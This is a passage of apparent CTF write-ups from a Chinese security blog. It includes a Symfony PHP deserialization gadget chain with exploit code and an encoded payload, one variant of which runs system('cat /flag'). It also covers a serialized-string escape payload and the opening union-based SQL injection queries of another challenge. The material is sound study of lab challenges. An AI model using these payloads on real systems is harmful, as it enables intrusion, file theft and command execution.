class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$ok</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>别的wp说这里的可以控制整个TagAwareAdapter类中的成员变量，所以可以控制所有的$this-&gt;xxx这样子的变量，注意到了下面的代码 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*PhpArrayAdapter类*/</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>在该类下ctrl+f搜一下$this-&gt;pool</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420141259145.png" alt="image-20230420141259145"></p>
<p>要实现AdapterInterface这个接口，如果找到某个类，它既实现了AdapterInterface这个接口，同时又有saveDeferred方法(或者没有而有__call方法)，而且满足一定条件能文件读取或命令执行即可</p>
<p>接下来就是需要找到任意一个实现了saveDeferred方法的类</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420140957207.png" alt="image-20230420140957207"></p>
<p>慢慢找，慢慢试，wp说只有一个正确的：PhpArrayAdapter.php跟进一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span>(<span class="params">CacheItemInterface <span class="variable">$item</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[<span class="variable">$item</span>-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>  $this-&gt;initialize();</p>
<p>本类是没有找到的，父类找了一下没找到，wp说了在父类，没想到藏那了</p>
<p>附上网图</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420144812865.png" alt="image-20230420144812865"></p>
<p>这也不是很好找的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$values</span> = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> !== \count(<span class="variable">$values</span>) || !<span class="keyword">isset</span>(<span class="variable">$values</span>[<span class="number">0</span>], <span class="variable">$values</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = <span class="variable">$values</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>include很好，符合我们构造pop链的思路</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">TagAwareAdapter.php-&gt;_destruct()</span><br><span class="line">-&gt;commit()</span><br><span class="line">-&gt;invalidateTags(<span class="keyword">array</span> <span class="variable">$tags</span>)</span><br><span class="line">-&gt;<span class="keyword">$this</span>-&gt;pool</span><br><span class="line">-&gt;saveDeferred(<span class="variable">$item</span>)</span><br><span class="line">PhpArrayAdapter.php-&gt;saveDeferred(CacheItemInterface <span class="variable">$item</span>)</span><br><span class="line">-&gt;initialize()</span><br><span class="line">PhpArrayTrait.php-&gt;initialize()</span><br></pre></td></tr></table></figure>

<p>这里不太明白他的exp，就是一些类和接口的实现不是太懂，看wp的</p>
<p>在PhpArrayAdapter类下的saveDeferred方法的入口参数item是实现了CacheItemInterface的，也就是item应该为实现了该接口的类的实例</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420145338062.png" alt="image-20230420145338062"></p>
<p>这个有点像，于是就有了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步探测看，其中item为deferred这个数组的值，并且这里的item需要实现CacheItemInterface接口，也就是item为CacheItem类的实例，而pool就是phparrayadapter的实例即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$deferred</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pool</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">&#x27;xxx&#x27;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最终</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$deferred</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$pool</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">&#x27;xxx&#x27;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有另外一个类可以试其实，ProxyAdapter.php，思路差不多，执行点在这里</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420154604945.png" alt="image-20230420154604945"></p>
<p>两个参数都可控，system(‘cat /flag’)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$innerItem</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$deferred</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred=<span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$setInnerItem</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setInnerItem = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420160337863.png" alt="image-20230420160337863"></p>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/W4nder/p/12361515.html">https://www.cnblogs.com/W4nder/p/12361515.html</a></p>
<p><a href="https://xz.aliyun.com/t/5816#toc-0">https://xz.aliyun.com/t/5816#toc-0</a></p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="comment">//定义filter函数过滤</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="comment">//implode() 函数，用于返回一个由数组元素组合成的字符串。*</span></span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123; </span><br><span class="line">    <span class="comment">//重设SESSION,使原来的销毁</span></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义SESSION</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment">//变量覆盖  可以覆盖原来的SESSION</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为了读取flag,需要绕过这个东西</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>拿到源码，先分析一番，看代码注释，这里面需要注意<a href="https://blog.csdn.net/sm20170867238/article/details/90745969">$_SESSION</a>以及变量覆盖</p>
<p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;one&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;tow&quot;</span>);</span><br><span class="line">extract(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>\n\$b = <span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//$a = one</span></span><br><span class="line"><span class="comment">//$b = tow</span></span><br></pre></td></tr></table></figure>

<p>覆盖例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);	<span class="comment">//将 $_POST 和 $_GET 中的变量解析出来，如果变量重名，那么就会把GET请求中的变量覆盖同名变量</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));		<span class="comment">//file_get_contents整个文件读入一个字符串中，也就是把变量的内容作为字符串输出；trim移除flag变量内容左右两边的变量符号</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)	</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>详细的PHP变量名覆盖看看这文章：</p>
<p><a href="https://blog.csdn.net/qq_45590334/article/details/126306461">https://blog.csdn.net/qq_45590334/article/details/126306461</a></p>
<p>既然他提示phpinfo，那肯定有点东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105105381.png" alt="image-20230424105105381"></p>
<p>猜测flag应该在这个文件里面</p>
<p>利用点其实就上面的变量覆盖，本地跑一下看看这个覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105247138.png" alt="image-20230424105247138"></p>
<p>直接进行变量覆盖，直接给$SESSION[‘img’]一个预想的值是不可以的，因为$SESSION[‘img’] = base64_encode(‘guest_img.png’)是后执行的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想到应该是用逃逸，很久前做过了，忘得差不多了，正好回顾下</p>
<p>基础就看看这个文章吧：<a href="https://baijiahao.baidu.com/s?id=1708960496312008602&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1708960496312008602&amp;wfr=spider&amp;for=pc</a></p>
<blockquote>
<p>​    代码会将userinfo中的[‘img’]值做base64解码，然后把提到的整个文件读入一个字符串中，所以我们就要构造img的值，让代码读出内容，经过上文的分析，想要修改img的值可以通过设置img_path，或者修改userinfo[‘img’]的内容</p>
</blockquote>
<blockquote>
<p>首先看修改img_path，这个方法有一个问题，修改img_path，传入的内容会被base64和sha1加密$_SESSION[‘img’] = sha1(base64_encode($_GET[‘img_path’]));，然而，高亮文件内容时只做了base64的解密，所以修改img_path是无法读到文件的，所以只能修改userinfo[‘img’]的内容，userinfo[‘img’]的内容由_SESSION组成，所以我们可以修改user和function，考虑到有过滤，可以采用<strong>反序列化字符逃逸</strong>来构造SESSION[‘img’]的值</p>
</blockquote>
<p>unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉，先看原先序列化后的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105310185.png" alt="image-20230424105310185"></p>
<p>其实这样就达到了<strong>键值的逃逸</strong></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105333657.png" alt="image-20230424105333657"></p>
<p>可以看到，flag被过滤掉了，但是长度却没有变，所以PHP读到的user的值其实为<code>&quot;;s</code>，共3位， 因此，如果想要构建代码，只能在user的值做恶意代码然后让其被过滤，然后在function构建代码，让function构建的代码生效</p>
<p>payload:<code>_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:6:&quot;hacker&quot;;s:4:&quot;hack&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105355983.png" alt="image-20230424105355983"></p>
<p>4个flag加上1个php，共23位被过滤，结果就是”;s:8:”function”;s:59:”被当做了user的值，而构造出来的”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:6:”hacker”;s:4:”hack”;}却成为了新的键值对，后面的hacker是因为SESSION一共有三个键值对，所以要填满</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105411037.png" alt="image-20230424105411037"></p>
<p><strong>键名逃逸</strong><br> 原理和上面一样，只不过这次被过滤的地方不是在值的位置，而是在键名的位置，然后在值的位置构造恶意代码<br> payload<code>_SESSION[flagphp]=;s:6:&quot;hacker&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/image-20230424105430005.png" alt="image-20230424105430005"></p>
<p>最后构造读一下</p>
<p><code>_SESSION[flagphp]=;s:4:&quot;hack&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
<p>一样是可以出的</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_45841815/article/details/119934050">参考文章1</a> <a href="https://blog.csdn.net/qq_54929891/article/details/123362853?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123362853-blog-124291588.235%5Ev31%5Epc_relevant_default_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123362853-blog-124291588.235%5Ev31%5Epc_relevant_default_base3&utm_relevant_index=2">参考文章2</a> <a href="https://blog.csdn.net/m0_51326092/article/details/119003596?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-119003596-blog-124644325.235%5Ev31%5Epc_relevant_default_base3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">参考文章3：可以看出构造的原理</a> <a href="https://www.cnblogs.com/h3zh1/p/12732336.html">参考文章4</a></p>
<p>不得不说从都到尾梳理一下可以很好回顾，下面再看看原理，之后再看看原生类反序列，也是比较常见的</p>
<p>这个是比较经典了：<a href="https://www.anquanke.com/post/id/238482#h3-8">安全客</a> <a href="https://www.secpulse.com/archives/165222.html">合天的反序列化逃逸详解</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
  </entry>
  <entry>
    <title>随意刷题03</title>
    <url>/p/f3969ae7.html</url>
    <content><![CDATA[<h2 id="Life-on-Mars"><a href="#Life-on-Mars" class="headerlink" title="Life on Mars"></a>Life on Mars</h2><p>这道题目一打开发现挺复杂的，扫描一下这个网站，没找到啥可疑之处，卡住了，瞎搞一番没有出来，试试的心态抓个包看看</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181957816.png" alt="image-20230418195655737"></p>
<p>再换其他的页面看看</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304181958654.png" alt="image-20230418195800627"></p>
<p>可以想到应该再这里做文章了，没想到sql，看了wp之后才知道，而且这个sql还不是很难，很多东西都没有过滤，基本的语句就可以搞定</p>
<p>这里是用了主要联合查询</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182019283.png" alt="image-20230418201943256"></p>
<p>这里面的都可以查询，但是需要注意的是名称都改小写了，而且单词之间加了个_</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182020896.png" alt="image-20230418202040724"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum</span><br></pre></td></tr></table></figure>

<p>联合查询一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=hesperia_planum union select 1,2,3</span><br></pre></td></tr></table></figure>

<p>返回2</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182023426.png" alt="image-20230418202324243"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查一下库：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>需要根据表的字段而定,也就是说当您进行查询时,语句的字段数必须保持和指定表中的字段数相同,不能增加或减少,否则将会出现报错告示。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182024050.png" alt="image-20230418202458025"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">user</span>()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182031231.png" alt="image-20230418203149196"></p>
